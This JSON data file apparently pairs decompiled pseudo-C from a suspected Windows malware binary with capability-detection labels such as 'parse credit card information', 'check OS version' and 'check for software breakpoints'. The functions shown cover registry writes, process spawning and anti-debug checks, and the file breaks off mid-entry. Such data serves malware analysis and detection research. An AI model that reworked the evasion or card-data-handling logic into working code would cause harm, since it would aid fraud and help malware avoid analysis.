{
    "004012e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004012e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    uVar2 = 0;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n    return iVar1 == 0;\n}\n",
        "token_count": 188
    },
    "00401e20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401e20(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x40708c, arg_8h);\n    (*pcVar2)(&var_268h, 0x4070a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_4ch = &var_164h;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    var_3ch = &var_ch;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_20h = ~uVar4 - 1;\n    var_38h = 0x4070cc;\n    var_34h = 0x4070d8;\n    var_30h = 0x4070e4;\n    var_2ch = 0x4070f4;\n    var_28h = 0x4070fc;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1127
    },
    "004023c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040240e) overlaps instruction at (ram,0x0040240b)\n// \n\nuint fcn.004023c0(void)\n\n{\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((4 < var_90h) && (4 >= var_90h)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 201
    },
    "00402430": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402430(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403880(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401a00": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401a65) overlaps instruction at (ram,0x00401a64)\n// \n// WARNING: Removing unreachable block (ram,0x00401b35)\n// WARNING: Removing unreachable block (ram,0x00401b3d)\n// WARNING: Removing unreachable block (ram,0x00401b40)\n// WARNING: Removing unreachable block (ram,0x00401a65)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401a00(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char *unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar lpCommandLine;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    if ((&stack0xfffffffc < 0x260) || (SBORROW4(&stack0xfffffffc, 0x260) == &lpszPath < 0)) {\n        func_0x00404890();\n    }\n    else {\n        *unaff_ESI = *unaff_ESI + unaff_ESI;\n    }\n    iVar2 = fcn.004011f0();\n    if (iVar2 != 0) {\n        lpszPath = 0;\n        puVar3 = &var_25fh;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        iVar2 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        bVar4 = iVar2 != 0;\n        if (bVar4) {\n            if ((bVar4) && (!bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            fcn.00402f70();\n            lpCommandLine = 0;\n            puVar3 = &var_15bh;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            var_14h = 0;\n            do {\n                puVar3 = &var_58h;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n                hProcess = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                lParam = 0;\n                var_28h._0_2_ = 0;\n                var_4h = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                if (iVar2 == 0) {\n                    return;\n                }\n                (*_sym.imp.KERNEL32.dll_Sleep)();\n                (*_sym.imp.USER32.dll_EnumWindows)();\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar2 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar1)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 934
    },
    "00402480": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040257d) overlaps instruction at (ram,0x0040257b)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl\nfcn.00402480(uint arg_8h, uchar *arg_ch, uint arg_10h, uchar *arg_14h, uint32_t arg_18h, uchar *arg_1ch, int32_t arg_20h\n            )\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uchar *extraout_ECX;\n    uint8_t uVar3;\n    uint32_t extraout_EDX;\n    uint *puVar5;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    uchar *puVar9;\n    uint arg_18h_00;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    uint32_t uVar4;\n    \n    fcn.00402630(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    arg_18h_00 = 0x20;\n    puVar9 = arg_1ch;\n    fcn.00402630(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    bVar6 = false;\n    bVar8 = false;\n    bVar7 = (arg_18h & 0x4d) == 0;\n    fcn.00402630(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    uVar4 = extraout_EDX;\n    if (!bVar8) {\n        uVar4 = extraout_EDX & 0xffff;\n        uVar3 = extraout_EDX;\n        if (bVar8) {\n            uVar1 = in(extraout_EDX);\n            *arg_1ch = uVar1;\n            arg_18h = CONCAT31(arg_18h >> 8, 0xbc);\n            arg_14h = extraout_ECX;\n            arg_1ch = puVar9;\n            if (!bVar6 && !bVar7) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x00402507;\n        }\n    }\n    uVar3 = uVar4;\n    arg_18h_00 = 0x20;\n    arg_ch = arg_14h;\ncode_r0x00402507:\n    *0x8d148b4d = *0x8d148b4d + 'M';\n    *0x8d148bb7 = *0x8d148bb7 + uVar3;\n    arg_14h[0x57] = arg_14h[0x57] & uVar3;\n    fcn.00402630(arg_18h & 0xffff0000 | CONCAT11(*arg_14h, arg_18h), 0x56, arg_1ch, arg_ch, arg_18h_00);\n    iVar2 = fcn.00402430();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar2 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar2;\n    }\n    var_10ch = 0;\n    puVar5 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_4h = 0x104;\n    *(puVar5 + 2) = 0;\n    iVar2 = fcn.00403880(0x80000001, 0x407258, 0x407284, &var_8h, &var_10ch, &var_4h);\n    if ((iVar2 != 0) && (iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x4072d4),  iVar2 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return iVar2;\n}\n",
        "token_count": 1038
    },
    "00404c60": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c60(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    ushort uVar2;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = iVar1;\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, uVar2);\n    (*_sym.imp.MSVCRT.dll_fflush)(uVar2);\n    (*_sym.imp.MSVCRT.dll_fclose)(uVar2);\n    return 1;\n}\n",
        "token_count": 149
    },
    "00403f30": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045f3) overlaps instruction at (ram,0x004045f2)\n// \n// WARNING: Removing unreachable block (ram,0x00404539)\n// WARNING: Removing unreachable block (ram,0x00404578)\n// WARNING: Removing unreachable block (ram,0x00404584)\n// WARNING: Removing unreachable block (ram,0x00404592)\n// WARNING: Removing unreachable block (ram,0x00404588)\n// WARNING: Removing unreachable block (ram,0x004045ab)\n// WARNING: Removing unreachable block (ram,0x004045b5)\n// WARNING: Removing unreachable block (ram,0x004045b6)\n// WARNING: Removing unreachable block (ram,0x004045ec)\n// WARNING: Removing unreachable block (ram,0x004045fc)\n// WARNING: Removing unreachable block (ram,0x00404638)\n// WARNING: Removing unreachable block (ram,0x00404644)\n// WARNING: Removing unreachable block (ram,0x00404652)\n// WARNING: Removing unreachable block (ram,0x00404667)\n// WARNING: Removing unreachable block (ram,0x00404677)\n// WARNING: Removing unreachable block (ram,0x00404740)\n// WARNING: Removing unreachable block (ram,0x00404755)\n// WARNING: Removing unreachable block (ram,0x00404749)\n// WARNING: Removing unreachable block (ram,0x0040476a)\n// WARNING: Removing unreachable block (ram,0x0040476e)\n// WARNING: Removing unreachable block (ram,0x0040476f)\n// WARNING: Removing unreachable block (ram,0x00404772)\n// WARNING: Removing unreachable block (ram,0x004047e0)\n// WARNING: Removing unreachable block (ram,0x004047ea)\n// WARNING: Removing unreachable block (ram,0x004047ee)\n// WARNING: Removing unreachable block (ram,0x00404807)\n// WARNING: Removing unreachable block (ram,0x00404813)\n// WARNING: Removing unreachable block (ram,0x00404821)\n// WARNING: Removing unreachable block (ram,0x0040466f)\n// WARNING: Removing unreachable block (ram,0x00404672)\n// WARNING: Removing unreachable block (ram,0x004045f3)\n// WARNING: Removing unreachable block (ram,0x004045f4)\n// WARNING: Removing unreachable block (ram,0x004045f5)\n// WARNING: Removing unreachable block (ram,0x004045f7)\n\nvoid __fastcall fcn.00403f30(uint param_1, uint16_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint16_t in_AX;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    char *pcVar7;\n    uint8_t extraout_CH;\n    uint8_t extraout_CH_00;\n    int32_t extraout_ECX;\n    int32_t iVar8;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint16_t uVar9;\n    uint32_t uVar10;\n    int32_t extraout_EDX;\n    int32_t iVar11;\n    int32_t extraout_EDX_00;\n    uint8_t *unaff_EBX;\n    uint *puVar12;\n    uint *unaff_EBP;\n    uint *puVar13;\n    int32_t *unaff_EDI;\n    int32_t *piVar14;\n    char cVar15;\n    uchar uVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    char cVar18;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar19;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar20;\n    uint in_stack_ffffa155;\n    uint in_stack_ffffa159;\n    char *pcVar21;\n    uint arg_10h;\n    uint arg_ch;\n    uint arg_10h_00;\n    uint *in_stack_ffffa181;\n    uint uStack24163;\n    uint uStack68;\n    int32_t *piVar22;\n    uint uVar23;\n    \n    uVar9 = (param_2 & 0xff00 | (param_2 & 0x4e | 0x38) & in_AX) & in_AX ^ 0x3c00;\n    uVar10 = (uVar9 & 0xff | (uVar9 >> 8) + (unaff_EBX >> 8) << 8) | 0x604;\n    bVar17 = (uVar10 >> 8) + uVar10 < '\\0';\n    uVar23 = 0x403f61;\n    iVar5 = fcn.00403920(0x423614, 8, 0x407024, 10);\n    if ((bVar17) || (!bVar17)) {\n        uVar23 = 0x12;\n    }\n    piVar6 = iVar5 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00403920(0x423614, 8, 0x407030, uVar23);\n    fcn.00403920(0x423614, 8, 0x407044, 4);\n    iVar4 = fcn.00403920(0x423614, 8, 0x407048, 0xc);\n    cVar15 = '\\0';\n    cVar19 = '\\0';\n    cVar18 = '\\0';\n    bVar17 = ((unaff_EDI | 0x74e3) - iVar4 & 0x1a8) == 0;\n    uVar23 = 0x404011;\n    fcn.00403920(0x423614, 8, 0x407054, 7);\n    if ((bVar17 || cVar19 != cVar18) || (!bVar17 && cVar19 == cVar18)) {\n        uVar23 = 0xb;\n    }\n    uVar20 = fcn.00403920(0x423614, 8, 0x40705c, uVar23);\n    pcVar21 = uVar20 >> 0x20;\n    pcVar7 = uVar20;\n    if ((bVar17) || (!bVar17)) {\n        piVar22 = 0xc;\n        piVar14 = unaff_EDI;\ncode_r0x00404048:\n        puVar1 = pcVar21 + 0xc;\n        *puVar1 = *puVar1 ^ extraout_CH;\n        bVar17 = *puVar1 == 0;\n        fcn.00403920(0x423614, 8, 0x407068, piVar22);\n        puVar13 = unaff_EBP;\n        if ((!bVar17) && (bVar17)) {\n            puVar12 = &stack0xffffffc0;\n            puVar13 = &stack0xffffffc0;\n            cVar15 = '\\x10';\n            do {\n                unaff_EBP = unaff_EBP + -1;\n                puVar12 = puVar12 + -1;\n                *puVar12 = *unaff_EBP;\n                cVar15 = cVar15 + -1;\n            } while ('\\0' < cVar15);\n        }\n        in_stack_ffffa159 = 0x407074;\n        in_stack_ffffa155 = 8;\n        fcn.00403920(0x423614, 8, 0x407074, 8);\n        bVar17 = false;\n        in_stack_ffffa181 = 0x423614;\n        fcn.00403920(0x423614, 8, 0x40707c, 0xd);\n        unaff_EBP = puVar13;\n        if (bVar17) goto code_r0x004040db;\n    }\n    else {\n        piVar14 = unaff_EDI + 1;\n        iVar11 = in(uVar20 >> 0x20);\n        *unaff_EDI = iVar11;\n        piVar22 = unaff_EDI;\n        if (0 < &stack0xffffffd4) goto code_r0x00404048;\n        *piVar14 = *piVar14 + -1;\n        *pcVar21 = *pcVar21 - cVar15;\n        bVar17 = SCARRY1(*pcVar7, uVar20);\n        *pcVar7 = *pcVar7 + uVar20;\n    }\n    if (bVar17) {\n        *in_stack_ffffa181 = uStack24163;\n        return;\n    }\ncode_r0x004040db:\n    fcn.00403920(0x423614, 8, 0x40708c, 0x18);\n    fcn.00403920(0x423614, 8, 0x4070a4, 0x25);\n    fcn.00403920(0x423614, 8, 0x4070cc, 10);\n    fcn.00403920(0x423614, 8, 0x4070d8, 0xc);\n    fcn.00403920(0x423614, 8, 0x4070e4, 0xd);\n    uVar16 = false;\n    cVar15 = (extraout_CH_00 | 0x47) == 0;\n    uVar23 = fcn.00403920(0x423614, 8, 0x4070f4, 6);\n    if ((!uVar16) && (uVar16)) {\n        out(0xbd, uVar23);\n        return;\n    }\n    fcn.00403920(0x423614, 8, 0x4070fc, 5);\n    while( true ) {\n        arg_10h = 8;\n        uVar23 = 0x4041fd;\n        fcn.00403920(0x423614, 8, 0x407104, 0x423614);\n        if ((uVar16) || (!uVar16)) break;\n        iVar8 = extraout_ECX + -1;\n        if (iVar8 == 0 || cVar15 == '\\0') {\n            iVar11 = *piVar6;\n            *piVar14 = iVar5 + -0x1bf31dd2;\n            uVar10 = *0x9750e2b5;\n            iVar11 = iVar11 >> 0x1f;\n            piVar6 = 0x6ab8ec44;\n            piVar22 = *0x9750e2b5 + 0x14;\n            iVar5 = *piVar22;\n            iVar2 = *piVar22;\n            *piVar22 = (iVar2 - unaff_EBP) - uVar16;\n            if (SBORROW4(iVar5, unaff_EBP) == SBORROW4(iVar2 - unaff_EBP, uVar16)) {\n                uVar3 = iVar8 >> 8;\n                *(uVar10 + 0x14) = *(uVar10 + 0x14) | uVar3;\n                iVar8 = -0x7c00000a;\n                iVar11 = *(uVar10 & 0xffffff00 | uVar10 + uVar3);\n            }\ncode_r0x0040421c:\n            *(iVar11 + 8) = *(iVar11 + 8) + (iVar8 >> 8);\n            fcn.00403920(0x423614, in_stack_ffffa155, in_stack_ffffa159, uVar23);\n            fcn.00403920(0x423614, 8, 0x407130, 0xf);\n            fcn.00403920(0x423614, 8, 0x407140, 0xe);\n            fcn.00403920(0x423614, 8, 0x407150, 0xb);\n            fcn.00403920(0x423614, 8, 0x40715c, 0xb);\n            fcn.00403920(0x423614, 8, 0x407168, 0xb);\n            uVar3 = fcn.00403920(0x423614, 8, 0x407174, 10);\n            iVar5 = piVar14 + 1;\n            cVar15 = uVar3 - *piVar14;\n            uVar10 = (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *piVar14) * 0x800 | (in_IF & 1) * 0x200 |\n                     (in_TF & 1) * 0x100 | (cVar15 < '\\0') * 0x80 | (cVar15 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                     ((POPCOUNT(cVar15) & 1U) == 0) * 4 | uVar3 < *piVar14 | (in_ID & 1) * 0x200000 |\n                     (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n            puVar13 = piVar6 + -1;\n            func_0x1018a288();\n            fcn.00403920(0x423614, 8, 0x407180, uVar10);\n            fcn.00403920(0x423614, 8, 0x40718c, 0xe);\n            fcn.00403920(0x423614, 8, 0x40719c, 0x11);\n            bVar17 = 0xffffffef < &stack0xffffa17d;\n            uVar16 = (POPCOUNT(unaff_EBX + 1 & 0xff) & 1U) == 0;\n            fcn.00403920(0x423614, 8, 0x4071b0, 0x13);\n            if ((!bVar17) && (bVar17)) {\n                unaff_EBX = unaff_EBX + bVar17 + *(unaff_EBX + extraout_EDX_00 * 4 + 0x69);\n                uVar16 = (POPCOUNT(unaff_EBX & 0xff) & 1U) == 0;\n            }\n            arg_10h_00 = 0x4071c4;\n            arg_ch = 8;\n            uVar10 = 0x4043cd;\n            uVar20 = fcn.00403920(0x423614, 8, 0x4071c4, 0x14);\n            pcVar7 = uVar20 >> 0x20;\n            uVar23 = uVar20;\n            if ((uVar16) || (uVar10 = uVar10 & 0xffff | puVar13 * 0x10000,  !uVar16)) {\n                uVar10 = 0x33;\n                arg_10h = 0x4071d8;\n                pcVar21 = 0x8;\n            }\n            else {\n                out(*puVar13, uVar20 >> 0x20);\n                do {\n                    cVar15 = uVar23 >> 8;\n                    in_AF = 9 < (uVar23 & 0xf) | in_AF;\n                    uVar23 = CONCAT31(CONCAT21(uVar23 >> 0x10, cVar15 - in_AF), -in_AF);\n                } while (in_AF || cVar15 == *pcVar7);\n                piVar14 = iVar5 + pcVar7 * 2;\n                *piVar14 = (*piVar14 + 0x7b) - in_AF;\n                *(extraout_ECX_00 + 0x6a) = uVar23;\n                *(unaff_EBX + 0x665110c4) = *(unaff_EBX + 0x665110c4) + 1;\n                puVar13 = piVar6 + 3;\n                pcVar21 = pcVar7;\n            }\n            pcVar7[8] = pcVar7[8] + (extraout_ECX_00 >> 8);\n            fcn.00403920(0x423614, pcVar21, arg_10h, uVar10);\n            fcn.00403920(0x423614, 8, 0x40720c, 10);\n            fcn.00403920(0x423614, 8, 0x407218, 4);\n            fcn.00403920(0x423614, 8, 0x40721c, 5);\n            fcn.00403920(0x423614, 8, 0x407224, 6);\n            bVar17 = (POPCOUNT(iVar5 & 0xff) & 1U) == 0;\n            uVar10 = 0x4044dc;\n            uVar20 = fcn.00403920(0x423614, 8, 0x407258, 0x2a);\n            pcVar7 = uVar20 >> 0x20;\n            uVar23 = uVar20;\n            if ((bVar17) || (uVar10 = uVar10 & 0xffff | puVar13 << 0x10,  !bVar17)) {\n                uVar10 = 0xb;\n                arg_10h_00 = 0x407284;\n                arg_ch = 8;\n            }\n            else {\n                out(*puVar13, uVar20 >> 0x20);\n                do {\n                    cVar15 = uVar23 >> 8;\n                    in_AF = 9 < (uVar23 & 0xf) | in_AF;\n                    uVar23 = CONCAT31(CONCAT21(uVar23 >> 0x10, cVar15 - in_AF), -in_AF);\n                } while (in_AF || cVar15 == *pcVar7);\n                piVar6 = iVar5 + pcVar7 * 2;\n                *piVar6 = (*piVar6 + 0x7b) - in_AF;\n                *(extraout_ECX_01 + 0x6a) = uVar23;\n            }\n            pcVar7[8] = pcVar7[8] + (extraout_ECX_01 >> 8);\n            fcn.00403920(0x423614, arg_ch, arg_10h_00, uVar10);\n            return;\n        }\n    }\n    uVar23 = 0x19;\n    in_stack_ffffa159 = 0x407114;\n    in_stack_ffffa155 = 8;\n    iVar8 = extraout_ECX;\n    iVar11 = extraout_EDX;\n    goto code_r0x0040421c;\n}\n",
        "token_count": 4241
    },
    "004039e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004039e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402f70();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004039b0();\n        arg_ch_01 = fcn.004039b0();\n        arg_ch_02 = fcn.004039b0();\n        fcn.00402fd0(arg_10h, arg_ch_00);\n        fcn.00402fd0(arg_8h, arg_ch_01);\n        fcn.00402fd0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00403780(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00403780(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00403780(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00402fd0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 617
    },
    "004035b0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403677) overlaps instruction at (ram,0x00403675)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004035b0(int32_t *arg_8h, uint *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    char cVar3;\n    uint32_t in_ECX;\n    int32_t in_EDX;\n    char unaff_BL;\n    int32_t *piVar5;\n    uint32_t uVar4;\n    \n    cVar3 = in_ECX;\n    uVar4 = in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - unaff_BL, cVar3);\n    *arg_8h = 0xda;\n    if ((uVar4 < in_EDX) || (in_EDX <= uVar4)) {\n        *(arg_8h + 1) = 8;\n        piVar2 = in_EAX;\n        piVar5 = arg_8h;\n    }\n    else {\n        *arg_8h = *arg_8h + in_ECX;\n        piVar2 = arg_8h;\n        piVar5 = in_EAX + 1;\n    }\n    *(piVar5 + 2) = 0x2c;\n    if ((cVar3 == '\\x01') || (cVar3 != '\\x01')) {\n        *(piVar5 + 3) = 0xe5;\n    }\n    *(piVar5 + 1) = 0xc0;\n    *(piVar5 + 5) = 0xd0;\n    uVar1 = (piVar2 & 0xff | ((piVar2 >> 8) - unaff_BL) + 0x4d << 8) & 0x26ae;\n    *(piVar5 + 6) = 0xae;\n    if ((uVar1 == 0) || (uVar1 != 0)) {\n        *(piVar5 + 7) = 0x17;\n    }\n    else {\n        piVar5 = piVar2 + 1;\n    }\n    while( true ) {\n        *(piVar5 + 2) = 0x40;\n        *(piVar5 + 9) = 0x4b;\n        *(arg_8h + 10) = 0x84;\n        *(arg_8h + 0xb) = 0xfa;\n        if (((piVar5 | 0x561b) <= in_EDX) || (in_EDX < (piVar5 | 0x561b))) break;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(arg_8h + 3) = 0xa5;\n    *(arg_8h + 0xd) = 0x30;\n    *arg_ch = 0xe;\n    return;\n}\n",
        "token_count": 680
    },
    "00402050": {
